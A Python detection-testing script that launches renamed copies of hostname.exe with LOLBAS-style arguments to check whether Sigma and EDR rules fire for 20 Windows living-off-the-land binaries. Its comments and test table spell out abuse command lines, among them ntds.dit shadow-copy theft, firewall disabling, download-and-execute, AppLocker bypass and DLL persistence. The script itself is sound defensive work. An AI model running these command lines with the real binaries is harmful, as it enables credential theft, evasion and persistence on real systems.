#!/usr/bin/env python3
r"""
LOLBin Masquerading Tester -- 20 Binaries, All Sigma+LOLBAS Sourced
=====================================================================
Scope: Msbuild.exe, Expand.exe, Extexport.exe, AppInstaller.exe,
  DumpMinitool.exe, IE4UINIT.exe, InfDefaultInstall.exe, MpCmdRun.exe,
  At.exe, Extrac32.exe, Psr.exe, Pnputil.exe, Cmstp.exe,
  Presentationhost.exe, Esentutl.exe, Rasautou.exe, InstallUtil.exe,
  Cmdl32.exe, Printbrm.exe, Netsh.exe

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ALL 20 NOW HAVE SIGMA RULES -- LOLBAS CONFIRMED SOURCES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Msbuild.exe
  Sigma: proc_creation_win_msbuild_suspicious_execution.yml
  LOLBAS: Execute inline C# from .csproj/.proj file; spawn arbitrary processes.
  Detection: Image|endswith '\MSBuild.exe' + .csproj arg from suspicious path.

Expand.exe
  Sigma: proc_creation_win_expand_cabinet_files.yml
  LOLBAS: expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat} -- copy/download file.
          expand {source} {dest} -- file copy between paths.
          expand {PATH_SMB} {PATH_ABSOLUTE}:ads.file -- copy to ADS.
  Detection: Image|endswith '\Expand.exe' + source/dest in CommandLine.

Extexport.exe
  Sigma: proc_creation_win_extexport_execution.yml (threat-hunting, name-only)
  LOLBAS: extexport.exe {folder} {dll1} {dll2} -- DLL sideloading.
  Detection: Image|endswith '\Extexport.exe' -- any execution flagged.

AppInstaller.exe
  Sigma: proc_creation_win_susp_appx_execution.yml (PARENT-CHILD)
  LOLBAS: Spawns suspicious child processes from WindowsApps.
  Detection: ParentImage|endswith '\AppInstaller.exe' AND child is cmd/powershell.

DumpMinitool.exe
  Sigma: proc_creation_win_dumpminitool_execution.yml
         proc_creation_win_dumpminitool_susp_execution.yml
  LOLBAS: DumpMinitool.exe --file {path} --processId {pid} --dumpType Full
  Detection: Image|endswith '\DumpMinitool.exe'
             + CommandLine|contains: '--file' AND '--processId' AND '--dumpType'

IE4UINIT.exe
  Sigma: proc_creation_win_lolbin_ie4uinit.yml
  LOLBAS: ie4uinit.exe -BaseSettings -- execute commands from ie4uinit.inf.
  Detection: Image|endswith '\ie4uinit.exe' AND NOT CurrentDirectory System32.
  *** Our temp dir is NOT System32 -- condition met naturally ***

InfDefaultInstall.exe
  Sigma: proc_creation_win_infdefaultinstall_execute_sct_scripts.yml
  LOLBAS: InfDefaultInstall.exe {path}.inf -- execute SCT via .inf.
  Detection: CommandLine|contains|all: ['InfDefaultInstall.exe', '.inf']

MpCmdRun.exe
  Sigma: proc_creation_win_mpcmdrun_dll_sideload_defender.yml
         proc_creation_win_mpcmdrun_download.yml
  LOLBAS: MpCmdRun.exe -DownloadFile -url {url} -path {dest} -- download file.
  Detection (sideload): Image|endswith '\MpCmdRun.exe' NOT from Defender path.
  Detection (download): CommandLine|contains|all ['-DownloadFile', '-url', '-path']

At.exe
  Sigma: proc_creation_win_at_command.yml
  LOLBAS: at.exe {time} /interactive cmd.exe -- schedule command execution.
  Detection: Image|endswith '\at.exe' + task creation CommandLine.

Extrac32.exe
  Sigma: proc_creation_win_lolbin_extrac32.yml
         proc_creation_win_lolbin_extrac32_ads.yml
  LOLBAS: extrac32 /Y /C {source} {dest} -- download/copy file.
          extrac32.exe /C {source} {dest} -- simple copy.
          extrac32 {cab} {dest}:file.exe -- extract to ADS.
  Detection: Image|endswith '\extrac32.exe'
             + CommandLine|contains '/C' (copy) OR ADS colon notation.

Psr.exe
  Sigma: proc_creation_win_psr_execution.yml (threat-hunting)
  LOLBAS: psr.exe /start /output {path}.zip /sc 1 /gui 0 -- screen capture.
  Detection: Image|endswith '\psr.exe'
             + CommandLine|contains '/start' AND '/output'.

Pnputil.exe
  Sigma: proc_creation_win_pnputil_driver_install.yml
  LOLBAS: pnputil.exe /add-driver {path}.inf -- install arbitrary driver.
  Detection: Image|endswith '\pnputil.exe' + '/add-driver' in CommandLine.

Cmstp.exe
  Sigma: proc_creation_win_cmstp_lolbin.yml
  LOLBAS: cmstp.exe /ni /s {path}.inf -- AppLocker bypass via COM.
  Detection: Image|endswith '\cmstp.exe'
             + CommandLine|contains '.inf' AND ('/ni' OR '/s').

Presentationhost.exe
  Sigma: proc_creation_win_presentationhost_download.yml
  LOLBAS: presentationhost.exe https://example.com/file.xbap -- download/execute.
  Detection: Image|endswith '\presentationhost.exe'
             + CommandLine|contains 'http://' OR 'https://' OR 'ftp://'.

Esentutl.exe
  Sigma: proc_creation_win_esentutl_susp_params.yml
  LOLBAS: esentutl.exe /y {source} /d {dest} /o -- file copy.
          esentutl.exe /y {vss_path} /d {dest} /o -- shadow copy access.
  Detection: Image|endswith '\esentutl.exe'
             + CommandLine|contains '/y' (copy) OR '/vss' OR '/r'.

Rasautou.exe
  Sigma: proc_creation_win_lolbin_rasautou_dll_execution.yml
  LOLBAS: rasautou.exe -d {dll} -p {export} -- load DLL and call export.
  Detection: Image|endswith '\rasautou.exe'
             + CommandLine|contains|all ['-d', '-p'].

InstallUtil.exe
  Sigma: proc_creation_win_installutil_download.yml
  LOLBAS: InstallUtil.exe https://example.com/file.dll -- download+execute.
  Detection: Image|endswith '\InstallUtil.exe'
             + CommandLine|contains 'http://' OR 'https://' OR 'ftp://'.

Cmdl32.exe
  Sigma: proc_creation_win_cmdl32_arbitrary_file_download.yml
  LOLBAS: cmdl32.exe /vpn /lan {config.pbk} -- download via VPN config.
  Detection: Image|endswith '\cmdl32.exe'
             + CommandLine|contains|all ['/vpn', '/lan'].

Printbrm.exe
  Sigma: proc_creation_win_lolbin_printbrm.yml
  LOLBAS: PrintBrm -b -d {SMB_folder} -f {local.zip} -- download/compress.
          PrintBrm -r -f {file}:hidden.zip -d {dest} -- ADS extraction.
  NOTE: Binary lives at C:\Windows\System32\spool\tools\PrintBrm.exe
  Detection: Image|endswith '\PrintBrm.exe' -- any execution flagged.

Netsh.exe
  Sigma: proc_creation_win_netsh_port_forwarding.yml
  LOLBAS: netsh interface portproxy add v4tov4 ... -- tunnel/port forward.
  Detection: CommandLine|contains|all ['interface','portproxy','add','v4tov4'].

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SAFETY MODEL: all processes are hash-verified copies of hostname.exe
(direct/parent-child uses cmd.exe copy for AppInstaller).
Popen() for real PIDs. Cleanup verified. Stray folders swept at startup.
REQUIREMENTS: Windows only.
"""

import hashlib
import json
import os
import platform
import shutil
import subprocess
import sys
import tempfile
import time
from datetime import datetime
from pathlib import Path

KEEP_RESULTS_LOG = True
CANARY_TAG = f"PURPLE-TEAM-TEST-{datetime.now().strftime('%Y%m%d%H%M%S')}"
SAFE_SOURCE_BINARY = r"C:\Windows\System32\hostname.exe"
SAFE_PARENT_BINARY = r"C:\Windows\System32\cmd.exe"
DROP_ARTIFACT_FILES = True

LOLBIN_TEST_CASES = {
    "MSBuild.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_msbuild_suspicious_execution.yml",
        "lolbas": "Execute inline C# from .csproj file; common payload delivery technique",
        "condition": "Image|endswith '\\MSBuild.exe' + .csproj from suspicious path",
        "artifact": "decoy_project.csproj",
        "args_variants": [
            lambda wd: [str(wd / "decoy_project.csproj")],
            lambda wd: ["/p:Configuration=Release", str(wd / "decoy_project.csproj")],
        ],
    },
    "Expand.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_expand_cabinet_files.yml",
        "lolbas": "Copy/download file: expand {source} {dest} | expand {SMB} {dest}",
        "condition": "Image|endswith '\\Expand.exe' + source AND dest paths in CommandLine",
        "artifact": "decoy_source.bat",
        "args_variants": [
            # Copy variant: expand source dest (LOLBAS documented)
            lambda wd: [str(wd / "decoy_source.bat"),
                        str(wd / "decoy_output.bat")],
            # Cabinet extraction variant: -F:* extracts all files
            lambda wd: [str(wd / "decoy_archive.cab"),
                        "-F:*", str(wd)],
        ],
    },
    "Extexport.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_extexport_execution.yml (threat-hunting, name-only)",
        "lolbas": "DLL sideloading: extexport.exe {folder} {dll1} {dll2}",
        "condition": "Image|endswith '\\Extexport.exe' -- any execution flagged",
        "artifact": None,
        "args_variants": [
            # Folder + DLL names as per LOLBAS documented syntax
            lambda wd: [str(wd), "mozcrt19.dll", "mozsqlite3.dll"],
        ],
    },
    "AppInstaller.exe": {
        "spawn_style": "parent_child",
        "sigma": "proc_creation_win_susp_appx_execution.yml",
        "lolbas": "Spawns cmd/powershell as child from WindowsApps directory",
        "condition": "PARENT-CHILD: ParentImage|endswith AppInstaller + child is cmd/powershell",
        "artifact": None,
        "args_variants": [lambda wd: []],
    },
    "DumpMinitool.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_dumpminitool_execution.yml + proc_creation_win_dumpminitool_susp_execution.yml",
        "lolbas": "DumpMinitool.exe --file {path} --processId {pid} --dumpType Full",
        "condition": "Image|endswith '\\DumpMinitool.exe' + '--file' AND '--processId' AND '--dumpType'",
        "artifact": None,
        "args_variants": [
            # Exact LOLBAS-documented syntax: --file --processId --dumpType
            lambda wd: ["--file", str(wd / "decoy_dump.dmp"),
                        "--processId", str(os.getpid()),
                        "--dumpType", "Full"],
            # MiniDumpWithFullMemory variant
            lambda wd: ["--file", str(wd / "decoy_dump2.dmp"),
                        "--processId", str(os.getpid()),
                        "--dumpType", "MiniDumpWithFullMemory"],
        ],
    },
    "IE4UINIT.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_lolbin_ie4uinit.yml",
        "lolbas": "ie4uinit.exe -BaseSettings -- execute commands from ie4uinit.inf",
        "condition": "Image|endswith '\\ie4uinit.exe' AND NOT CurrentDirectory=System32 (temp dir qualifies!)",
        "artifact": None,
        "args_variants": [
            # -BaseSettings is the documented LOLBAS abuse flag
            lambda wd: ["-BaseSettings"],
            lambda wd: ["-show"],
        ],
    },
    "InfDefaultInstall.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_infdefaultinstall_execute_sct_scripts.yml",
        "lolbas": "InfDefaultInstall.exe {path}.inf -- execute SCT script via .inf file",
        "condition": "CommandLine|contains|all: ['InfDefaultInstall.exe', '.inf']",
        "artifact": "decoy_payload.inf",
        "args_variants": [
            # Binary name appears in full path + .inf in arg = both conditions met
            lambda wd: [str(wd / "decoy_payload.inf")],
        ],
    },
    "MpCmdRun.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_mpcmdrun_dll_sideload_defender.yml + proc_creation_win_mpcmdrun_download.yml",
        "lolbas": "MpCmdRun.exe -DownloadFile -url {url} -path {dest}",
        "condition": "NOT from Defender path (location rule) + '-DownloadFile -url -path' (download rule)",
        "artifact": None,
        "args_variants": [
            # Download variant: exact LOLBAS + Sigma matched flags
            lambda wd: ["-DownloadFile",
                        "-url", "https://example.com/decoy.exe",
                        "-path", str(wd / "decoy_download.exe")],
            # Name-only: sideloading fires because we're NOT in Defender's dir
            lambda wd: [],
        ],
    },
    "At.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_at_command.yml",
        "lolbas": "at.exe {time} /interactive cmd.exe -- schedule command execution",
        "condition": "Image|endswith '\\at.exe' + task scheduling syntax in CommandLine",
        "artifact": None,
        "args_variants": [
            # Classic at.exe scheduled task abuse
            lambda wd: ["13:00", "/interactive", "cmd.exe"],
            # Remote scheduling variant
            lambda wd: ["\\\\127.0.0.1", "13:00", "cmd.exe",
                        "/c", "echo " + CANARY_TAG],
        ],
    },
    "Extrac32.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_lolbin_extrac32.yml + proc_creation_win_lolbin_extrac32_ads.yml",
        "lolbas": "extrac32.exe /C {source} {dest} | extrac32 /Y /C {smb} {dest}",
        "condition": "Image|endswith '\\extrac32.exe' + '/C' for copy OR ADS notation",
        "artifact": "decoy_source.txt",
        "args_variants": [
            # /C copy: exact LOLBAS documented syntax
            lambda wd: ["/C", str(wd / "decoy_source.txt"),
                        str(wd / "decoy_output.txt")],
            # /Y /C overwrite copy variant
            lambda wd: ["/Y", "/C", str(wd / "decoy_source.txt"),
                        str(wd / "decoy_output2.txt")],
        ],
    },
    "Psr.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_psr_execution.yml (threat-hunting)",
        "lolbas": "psr.exe /start /output {path}.zip /sc 1 /gui 0 -- screen recorder/keylogger",
        "condition": "Image|endswith '\\psr.exe' + '/start' AND '/output' in CommandLine",
        "artifact": None,
        "args_variants": [
            # Exact LOLBAS syntax: /start /output /sc /gui
            lambda wd: ["/start", "/output",
                        str(wd / "decoy_recording.zip"),
                        "/sc", "1", "/gui", "0"],
        ],
    },
    "Pnputil.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_pnputil_driver_install.yml",
        "lolbas": "pnputil.exe /add-driver {path}.inf -- install unsigned/arbitrary driver",
        "condition": "Image|endswith '\\pnputil.exe' + '/add-driver' OR '-a' in CommandLine",
        "artifact": "decoy_driver.inf",
        "args_variants": [
            lambda wd: ["/add-driver", str(wd / "decoy_driver.inf")],
            lambda wd: ["-a", str(wd / "decoy_driver.inf")],
        ],
    },
    "Cmstp.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_cmstp_lolbin.yml",
        "lolbas": "cmstp.exe /ni /s {path}.inf -- bypass AppLocker via COM scriptlet",
        "condition": "Image|endswith '\\cmstp.exe' + '.inf' AND ('/ni' OR '/s') in CommandLine",
        "artifact": "decoy_config.inf",
        "args_variants": [
            lambda wd: ["/ni", "/s", str(wd / "decoy_config.inf")],
            lambda wd: ["/s", str(wd / "decoy_config.inf")],
        ],
    },
    "Presentationhost.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_presentationhost_download.yml",
        "lolbas": "presentationhost.exe https://example.com/file.xbap -- download+execute XBAP",
        "condition": "Image|endswith '\\presentationhost.exe' + http/https/ftp in CommandLine",
        "artifact": None,
        "args_variants": [
            lambda wd: ["https://example.com/decoy_payload.xbap"],
            lambda wd: ["http://example.com/decoy_payload.xbap"],
        ],
    },
    "Esentutl.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_esentutl_susp_params.yml",
        "lolbas": "esentutl.exe /y {source} /d {dest} /o -- file copy; /vss shadow copy",
        "condition": "Image|endswith '\\esentutl.exe' + '/y' OR '/vss' + suspicious path",
        "artifact": "decoy_source.db",
        "args_variants": [
            # /y copy to suspicious temp path (temp dir satisfies suspicious-path condition)
            lambda wd: ["/y", str(wd / "decoy_source.db"),
                        "/d", str(wd / "decoy_dest.db"), "/o"],
            # VSS shadow copy access variant
            lambda wd: ["/y",
                        r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit",
                        "/d", str(wd / "decoy_ntds.dit"), "/o"],
        ],
    },
    "Rasautou.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_lolbin_rasautou_dll_execution.yml",
        "lolbas": "rasautou.exe -d {dll_path} -p {export_name} -- load DLL + call export",
        "condition": "Image|endswith '\\rasautou.exe' + '-d' AND '-p' in CommandLine",
        "artifact": "decoy_payload.dll",
        "args_variants": [
            lambda wd: ["-d", str(wd / "decoy_payload.dll"),
                        "-p", "DecoyExport"],
        ],
    },
    "InstallUtil.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_installutil_download.yml",
        "lolbas": "InstallUtil.exe https://example.com/payload.dll -- download+execute assembly",
        "condition": "Image|endswith '\\InstallUtil.exe' + http/https/ftp URL in CommandLine",
        "artifact": None,
        "args_variants": [
            lambda wd: ["https://example.com/decoy_assembly.dll"],
            lambda wd: ["/logfile=", "/LogToConsole=false",
                        "/U", "https://example.com/decoy_assembly.dll"],
        ],
    },
    "Cmdl32.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_cmdl32_arbitrary_file_download.yml",
        "lolbas": "cmdl32.exe /vpn /lan {config.pbk} -- download arbitrary file via VPN config",
        "condition": "Image|endswith '\\cmdl32.exe' + '/vpn' AND '/lan' in CommandLine",
        "artifact": "decoy_vpn.pbk",
        "args_variants": [
            lambda wd: ["/vpn", "/lan", str(wd / "decoy_vpn.pbk")],
        ],
    },
    "PrintBrm.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_lolbin_printbrm.yml",
        "lolbas": "PrintBrm -b -d {smb_folder} -f {local.zip} -- exfil/download as ZIP; -r to extract ADS",
        "condition": "Image|endswith '\\PrintBrm.exe' -- any execution flagged (name-only rule)",
        "artifact": None,
        "args_variants": [
            # Backup/download variant: -b -d {source} -f {zip_output}
            lambda wd: ["-b", "-d", str(wd),
                        "-f", str(wd / "decoy_printers.zip")],
            # Restore variant: -r -f {zip} -d {dest}
            lambda wd: ["-r", "-f", str(wd / "decoy_printers.zip"),
                        "-d", str(wd)],
        ],
    },
    "Netsh.exe": {
        "spawn_style": "direct",
        "sigma": "proc_creation_win_netsh_port_forwarding.yml",
        "lolbas": "netsh interface portproxy add v4tov4 ... -- C2 tunnel / port forwarding",
        "condition": "CommandLine|contains|all: ['interface','portproxy','add','v4tov4']",
        "artifact": None,
        "args_variants": [
            # Port forwarding tunnel (all 4 Sigma-required substrings present)
            lambda wd: ["interface", "portproxy", "add", "v4tov4",
                        "listenport=8080", "listenaddress=0.0.0.0",
                        "connectport=80", "connectaddress=127.0.0.1"],
            # Firewall disable variant (additional LOLBAS technique)
            lambda wd: ["advfirewall", "set", "allprofiles", "state", "off"],
            # Netsh helper DLL persistence
            lambda wd: ["add", "helper",
                        str(wd / "decoy_helper.dll")],
        ],
    },
}


def sha256_of(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def sweep_stray_runs():
    removed = []
    for p in Path(tempfile.gettempdir()).glob("lolbin20fin_*"):
        if p.is_dir():
            shutil.rmtree(p, ignore_errors=True)
            if not p.exists():
                removed.append(str(p))
    return removed


def verified_cleanup(work_dir):
    shutil.rmtree(work_dir, ignore_errors=True)
    if not work_dir.exists():
        return True, []
    leftover = []
    for p in work_dir.rglob("*"):
        if p.is_file():
            try:
                p.unlink()
            except Exception:
                leftover.append(str(p))
    try:
        work_dir.rmdir()
    except Exception:
        pass
    return (not work_dir.exists()), leftover


def run_and_classify(cmd, timeout=15):
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
        pid = proc.pid
        try:
            proc.communicate(timeout=timeout)
            return f"exited on its own (rc={proc.returncode})", pid
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.communicate()
            return f"did not exit within {timeout}s -- killed", pid
    except OSError as e:
        if getattr(e, "winerror", None) == 5:
            return "BLOCKED (WinError 5 -- EDR/AV prevention fired)", None
        return f"launch error: {e}", None
    except Exception as e:
        return f"error: {e}", None


def casing_variants(name):
    seen, out = set(), []
    for v in [name.lower(), name, name.upper()]:
        if v not in seen:
            seen.add(v)
            out.append(v)
    return out


def main():
    if platform.system() != "Windows":
        print("Windows only -- exiting without doing anything.")
        sys.exit(1)

    for binary in [SAFE_SOURCE_BINARY, SAFE_PARENT_BINARY]:
        if not Path(binary).exists():
            print(f"Cannot find {binary} -- aborting.")
            sys.exit(1)

    source_hash = sha256_of(SAFE_SOURCE_BINARY)
    parent_hash = sha256_of(SAFE_PARENT_BINARY)

    stray = sweep_stray_runs()
    if stray:
        print(f"Swept {len(stray)} leftover folder(s) from previous run.\n")

    work_dir = Path(tempfile.mkdtemp(prefix="lolbin20fin_"))
    print("=" * 78)
    print(f"LOLBin Tester -- 20 binaries, Sigma+LOLBAS sourced, all in one run")
    print("=" * 78)
    print(f"Canary tag     : {CANARY_TAG}")
    print(f"hostname SHA256: {source_hash}")
    print(f"cmd.exe SHA256 : {parent_hash}")
    print(f"Working dir    : {work_dir}")
    print(f"  (\\AppData\\Local\\Temp\\ -- satisfies location-based rules)\n")

    # Pre-drop all placeholder artifacts
    for fname in ["decoy_source.bat", "decoy_source.txt", "decoy_source.db",
                  "decoy_archive.cab", "decoy_driver.inf", "decoy_config.inf",
                  "decoy_payload.inf", "decoy_payload.dll", "decoy_project.csproj",
                  "decoy_vpn.pbk", "decoy_helper.dll", "decoy_printers.zip"]:
        p = work_dir / fname
        if not p.exists():
            p.write_text(
                f"PURPLE TEAM TEST ARTIFACT - NOT EXECUTABLE\nCanary: {CANARY_TAG}\n"
            )

    log = []
    try:
        for canonical_name, cfg in LOLBIN_TEST_CASES.items():
            print(f"{'='*60}")
            print(f"[*] {canonical_name}  [{cfg['spawn_style']}]")
            print(f"    Sigma  : {cfg['sigma']}")
            print(f"    LOLBAS : {cfg['lolbas']}")
            print(f"    Cond   : {cfg['condition']}")
            print()

            if DROP_ARTIFACT_FILES and cfg["artifact"]:
                p = work_dir / cfg["artifact"]
                if not p.exists():
                    p.write_text(
                        f"PURPLE TEAM TEST ARTIFACT - NOT EXECUTABLE\n"
                        f"Canary: {CANARY_TAG}\n"
                    )

            # ── PARENT-CHILD ──────────────────────────────────────────
            if cfg["spawn_style"] == "parent_child":
                for case_name in casing_variants(canonical_name):
                    decoy_path = work_dir / case_name
                    shutil.copy2(SAFE_PARENT_BINARY, decoy_path)
                    if sha256_of(decoy_path) != parent_hash:
                        print(f"    [{case_name}] hash mismatch -- ABORTED")
                        continue
                    cmd = [str(decoy_path), "/c", SAFE_SOURCE_BINARY]
                    print(f"    [{case_name}] {' '.join(cmd)}")
                    print(f"    -> child's ParentImage = {case_name}")
                    ts = datetime.now().isoformat()
                    status, pid = run_and_classify(cmd)
                    print(f"         -> {status}  pid={pid}")
                    log.append({"name": canonical_name, "cased_as": case_name,
                                "spawn_style": "parent_child", "variant": 1,
                                "timestamp": ts, "command": " ".join(cmd),
                                "status": status, "pid": pid})
                    time.sleep(0.75)
                print()
                continue

            # ── DIRECT ───────────────────────────────────────────────
            blocked_globally = False
            for case_name in casing_variants(canonical_name):
                if blocked_globally:
                    break
                decoy_path = work_dir / case_name
                shutil.copy2(SAFE_SOURCE_BINARY, decoy_path)
                if sha256_of(decoy_path) != source_hash:
                    print(f"    [{case_name}] hash mismatch -- ABORTED")
                    continue

                for i, args_fn in enumerate(cfg["args_variants"], start=1):
                    cmd = [str(decoy_path)] + args_fn(work_dir)
                    print(f"    [{case_name}] v{i}: {' '.join(cmd)}")
                    ts = datetime.now().isoformat()
                    status, pid = run_and_classify(cmd)
                    print(f"         -> {status}  pid={pid}")
                    log.append({"name": canonical_name, "cased_as": case_name,
                                "spawn_style": "direct", "variant": i,
                                "timestamp": ts, "command": " ".join(cmd),
                                "status": status, "pid": pid})
                    time.sleep(0.75)
                    if "BLOCKED" in status:
                        blocked_globally = True
                        break
            print()
    finally:
        cleaned, leftover = verified_cleanup(work_dir)

    print("=" * 78)
    print(f"CLEANUP: {work_dir} removed = {cleaned}")
    if not cleaned:
        for f in leftover:
            print(f"  STUCK: {f}")
    print("=" * 78 + "\n")

    if KEEP_RESULTS_LOG:
        results_file = Path.cwd() / f"lolbin20fin_results_{CANARY_TAG}.json"
        with open(results_file, "w") as f:
            json.dump({"canary_tag": CANARY_TAG,
                       "hostname_sha256": source_hash,
                       "cmd_sha256": parent_hash,
                       "work_dir_cleaned": cleaned,
                       "results": log}, f, indent=2)
        print(f"Results saved: {results_file}")

    blocked = sum(1 for e in log if "BLOCKED" in e.get("status", ""))
    print(f"\nSearch QRadar for canary tag: {CANARY_TAG}")
    print(f"EDR blocked: {blocked} event(s)")
    print(f"Total events generated: {len(log)}")


if __name__ == "__main__":
    main()
